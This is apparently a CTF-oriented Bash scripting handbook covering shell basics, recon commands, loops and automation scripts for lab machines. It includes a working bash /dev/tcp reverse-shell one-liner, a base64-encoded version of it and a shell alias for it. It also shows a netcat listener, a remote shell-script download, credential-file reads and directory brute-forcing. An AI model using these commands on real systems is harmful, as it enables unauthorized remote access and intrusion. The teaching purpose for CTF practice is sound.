---
icon: circle-dollar
---

# DeepDive into Bash

## **The Ultimate Bash Scripting Handbook for CTFs: Conquer the Command Line**

Bash scripting is the backbone of a CTF player’s workflow — automating enumeration, parsing loot, exploiting vulnerable systems, and chaining tools into efficient, repeatable workflows.\
This handbook is your **Bash arsenal** — from fundamentals to advanced automation used by red teamers and hardcore CTF competitors.

***

### I. 🧩 Core Concepts

| Concept                   | Description                                                     |
| ------------------------- | --------------------------------------------------------------- |
| **Shell**                 | The command-line interpreter (e.g., Bash, Zsh).                 |
| **Commands**              | Instructions executed by the shell (`ls`, `grep`, `awk`, etc.). |
| **Variables**             | Store and reuse data dynamically.                               |
| **Control Flow**          | `if`, `for`, `while`, `case` — control logic and decisions.     |
| **Functions**             | Modular, reusable code blocks.                                  |
| **Pipes & Redirection**   | `<`, `>`, `>>`, \`                                              |
| **Subshells**             | `( ... )` for isolated command execution environments.          |
| **Environment Variables** | `$PATH`, `$USER`, `$PWD`, `$SHELL`, `$RANDOM`.                  |

***

### II. ⚙️ Essential Bash Commands for CTFs

#### 🔍 Enumeration & System Recon

```bash
uname -a                # Kernel info
whoami                  # Current user
id                      # User/group details
ps aux | grep process   # Find running processes
ss -tuln                # List open ports
lsblk                   # List block devices
```

#### 📂 File Manipulation

```bash
ls -la
cd /tmp
cat /etc/passwd
find / -type f -perm -4000 2>/dev/null  # Find SUID binaries
```

#### 🧠 Text Processing

```bash
grep -r "flag" /opt/
awk -F: '{print $1}' /etc/passwd
sed 's/root/admin/g' config.txt
cut -d' ' -f1 file.txt
sort | uniq -c | sort -nr
```

#### 🌐 Networking

```bash
ping -c 1 10.10.10.10
curl -s http://10.10.10.10:8080
wget http://target.com/shell.sh
nc -lvnp 4444          # Reverse shell listener
```

***

### III. 🧮 Bash Scripting Essentials

#### 🪶 Variables

```bash
name="ctfplayer"
echo "Hello, $name!"
```

#### 🧠 Command Substitution

```bash
ip=$(hostname -I)
echo "Local IP: $ip"
```

#### 🔄 Conditionals

```bash
if [ -f "/etc/shadow" ]; then
    echo "Shadow file exists!"
else
    echo "No access"
fi
```

#### 🔁 Loops

```bash
for i in {1..5}; do
    echo "Pinging 10.10.10.$i"
    ping -c 1 10.10.10.$i | grep "bytes from"
done
```

#### 🔧 Functions

```bash
scan_port() {
    nc -zv $1 $2 2>&1 | grep "succeeded"
}
scan_port 10.10.10.5 22
```

***

### IV. 💣 Advanced Bash for CTFs

#### 🧩 Automating Enumeration

```bash
#!/bin/bash
ip=$1
echo "[*] Scanning $ip"
nmap -sC -sV -oN nmap_$ip.txt $ip
cat nmap_$ip.txt | grep "open"
```

#### 🕵️ File Search + Extraction

```bash
find / -type f -name "*flag*" 2>/dev/null
grep -r "flag" /var/www/html 2>/dev/null
strings suspicious.bin | grep "HTB"
```

#### 💀 Reverse Shells

```bash
bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
```

Or encoded:

```bash
echo "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" | base64
```

#### 🧰 Data Parsing Tricks

```bash
cat urls.txt | while read url; do
    curl -s $url | grep "admin"
done
```

#### 🧠 Oneliner Automation (Weaponized Bash)

```bash
for i in $(seq 1 255); do
    (ping -c 1 10.10.10.$i | grep "bytes from" &) 
done
```

#### 🧷 Subshell Magic

```bash
(cd /tmp && ls)
pwd  # Still in original dir
```

#### ⚠️ Trap & Signal Handling

```bash
trap "echo '[!] Interrupted'; exit" INT
```

***

### V. 🚩 CTF-Oriented Practical Examples

#### 🕳️ Brute-forcing Directories

```bash
for dir in $(cat wordlist.txt); do
    status=$(curl -s -o /dev/null -w "%{http_code}" http://10.10.10.5/$dir/)
    if [ $status -eq 200 ]; then
        echo "Found: $dir"
    fi
done
```

#### 🔑 Decoding Challenge Files

```bash
cat encoded.txt | base64 -d | strings
```

#### 🧬 Automated Exploit Chain

```bash
for host in $(cat targets.txt); do
    echo "[+] Exploiting $host"
    nc -zv $host 22 && echo "SSH Open"
done
```

***

### VI. 🧠 CTF Pro Tips

* Use `set -x` for debugging scripts.
* Automate **recon → exploitation → loot extraction** in one pipeline.
* Always sanitize inputs; CTF boxes love to break sloppy scripts.
*   Use `.bashrc` aliases for repetitive CTF commands:

    ```bash
    alias scan="nmap -sC -sV -Pn"
    alias serve="python3 -m http.server 8000"
    alias rev="bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"
    ```
* Keep a `~/scripts/` folder synced with GitHub or your GitBook for easy sharing.

***

### VII. 🧨 Bonus: Bash Script Template for CTFs

```bash
#!/bin/bash
# Author: yourname
# Usage: ./ctfscan.sh <target>

target=$1
echo "[+] Scanning $target"
nmap -sC -sV -oN results_$target.txt $target

echo "[+] Searching for flags"
grep -r "flag" /home /var/www 2>/dev/null
```

***
